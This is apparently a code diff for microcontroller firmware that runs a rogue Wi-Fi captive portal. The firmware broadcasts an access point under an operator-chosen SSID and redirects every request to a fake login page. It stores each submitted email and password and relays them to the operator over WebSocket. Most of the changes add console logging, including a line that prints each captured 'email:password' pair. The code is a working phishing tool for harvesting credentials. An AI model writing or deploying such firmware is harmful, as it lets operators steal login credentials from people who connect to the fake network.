@@ -4,6 +4,8 @@ AsyncWebServer server(http_port);
 WebSocketsServer webSocket = WebSocketsServer(ws_port);
 DNSServer dnsServer;
 
+Console console;
+
 LinkedList<User> credsList = LinkedList<User>();
 
 bool portalOpen = false;
@@ -17,6 +19,8 @@ void setupWifi(const char *ssid, const IPAddress &localIP, const IPAddress &gate
   IPAddress myIP = WiFi.softAPIP();
   Serial.print("AP IP address: ");
   Serial.println(myIP);
+
+  console.log("AP IP: " + (String) myIP);
 }
 
 void setupDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
@@ -49,7 +53,6 @@ void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
 	// The Catch All
 	server.onNotFound([](AsyncWebServerRequest *request) {
 		request->redirect(localIPURL);
-		Serial.print("Redirected to " + localIPURL + "\n");
 	});
 
   server.on("/post", HTTP_POST, [](AsyncWebServerRequest *request) {
@@ -71,11 +74,13 @@ void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
       userData.email = request->getParam("email", true)->value().c_str();
       userData.pass = request->getParam("password", true)->value().c_str();
 
+      console.log("Logged User - " + (String)userData.email + ":" + (String)userData.pass);
+
       credsList.add(userData);
 
       if (webSocket.connectedClients() > 0) {
-      jsonDoc["email"] = request->getParam("email", true)->value().c_str();
-      jsonDoc["password"] = request->getParam("password", true)->value().c_str();
+        jsonDoc["email"] = request->getParam("email", true)->value().c_str();
+        jsonDoc["password"] = request->getParam("password", true)->value().c_str();
 
         char data[200];
         serializeJson(jsonDoc, data); 
@@ -99,6 +104,7 @@ void onWebSocketEvent(uint8_t client_number,
     // Client has disconnected
     case WStype_DISCONNECTED:
       Serial.printf("[%u] Disconnected!\n", client_number);
+      console.log("[" + ((String) client_number) + "]" + " Disconnected");
       break;
 
     // New client has connected
@@ -107,6 +113,7 @@ void onWebSocketEvent(uint8_t client_number,
         IPAddress ip = webSocket.remoteIP(client_number);
         Serial.printf("[%u] Connection from ", client_number);
         Serial.println(ip.toString());
+        console.log("[" + ((String) client_number) + "]" + " Connected from " + ip.toString());
       }
       break;
 
@@ -119,6 +126,7 @@ void onWebSocketEvent(uint8_t client_number,
       if (error) {
         Serial.print("deserializeJson() returned ");
         Serial.println(error.c_str());
+        console.log("Bad JSON");
         return;
       }
 
@@ -126,6 +134,7 @@ void onWebSocketEvent(uint8_t client_number,
 
       // Print out raw message
       Serial.printf("[%u] Received text: %s\n", client_number, action);
+      console.log("[" + ((String) client_number) + "]" + " sent a message");
 
       // Shutdown portal and device
       if ( strcmp((char *)action, "shutdown") == 0 ) {
@@ -138,6 +147,7 @@ void onWebSocketEvent(uint8_t client_number,
         const char* newSSID = jsonDoc["value"];
 
         Serial.printf("[%u] New SSID: %s\n", client_number, newSSID);
+        console.log("[" + ((String) client_number) + "]" + " - NEW SSID: " + newSSID);
 
         closePortal();
         delay(5000);
@@ -163,6 +173,7 @@ void onWebSocketEvent(uint8_t client_number,
         }
       } else {
         Serial.printf("[%u] Message not recognized\n", client_number);
+        console.log("[" + ((String) client_number) + "]" + " - Message not recognized");
       }
     }
     break;
@@ -180,8 +191,6 @@ void onWebSocketEvent(uint8_t client_number,
 }
 
 void openPortalSSID(const char *ssid) {
-  tft.clearDisplay();
-
   setupWifi(ssid, localIP, localIP);
 
   setupDNSServer(dnsServer, localIP);
@@ -192,9 +201,10 @@ void openPortalSSID(const char *ssid) {
   webSocket.begin();
   webSocket.onEvent(onWebSocketEvent);
 
-  Serial.println("Server started");
-
   portalOpen = true;
+
+  Serial.println("Server started");
+  console.log("Server started");
 }
 
 void openPortal() {
@@ -205,10 +215,11 @@ void closePortal() {
   webSocket.close();
   dnsServer.stop();
   WiFi.softAPdisconnect(true);
-  tft.clearDisplay();
+
+  portalOpen = false;
 
   Serial.println("Server closed");
-  portalOpen = false;
+  console.log("Server closed");
 }
 
 void portalLoop() {
@@ -219,4 +230,8 @@ void portalLoop() {
 
 bool isPortalOpen() {
   return portalOpen;
+}
+
+String getSSID() {
+  return defaultSSID;
 }
